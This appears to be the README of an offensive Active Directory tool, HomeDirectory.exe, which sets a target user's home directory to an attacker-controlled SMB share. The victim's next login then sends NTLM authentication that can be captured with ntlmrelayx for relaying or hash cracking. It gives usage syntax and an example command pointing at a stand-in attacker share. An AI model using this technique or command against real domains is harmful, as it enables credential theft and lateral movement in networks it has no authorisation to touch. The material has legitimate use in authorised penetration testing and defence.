# HomeDirectory
Leverage existing AD rights ('GenericAll') over an object ie: user to set their profile to an attacker smb server ie: ntlmrelayx to dump hashes, relay, crack.

Usage: HomeDirectory.exe <username> <drive letter> <attacker share>
Example: HomeDirectory.exe jblogg N \\attackerip\bogus_share
    * targets next login will trigger NTLM auth when trying to retrieve profile from attackers smb server
  
 
